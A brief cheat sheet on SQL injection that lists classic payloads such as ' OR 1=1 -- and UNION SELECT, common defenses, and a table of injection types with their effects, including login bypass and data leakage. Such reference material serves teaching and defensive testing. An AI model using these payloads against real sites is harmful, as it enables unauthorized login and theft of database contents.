Common SQLi Payloads:

- ' OR 1=1 --
- ' UNION SELECT NULL, NULL --
- ' AND 1=1 --
- ' AND 1=2 --

Defenses:

- Prepared statements
- Input validation
- WAF (Web Application Firewall)
- DB user privilege control

| Type             | Example                    | Result              |
| ---------------- | -------------------------- | ------------------- |
| **Login Bypass** | `' OR 1=1 --`              | Skip password       |
| **Error-Based**  | `'`                        | Site gives DB error |
| **Union-Based**  | `' UNION SELECT 1,2,3 --`  | Leak other data     |
| **Blind SQLi**   | `' AND 1=1` vs `' AND 1=2` | Guess slowly        |
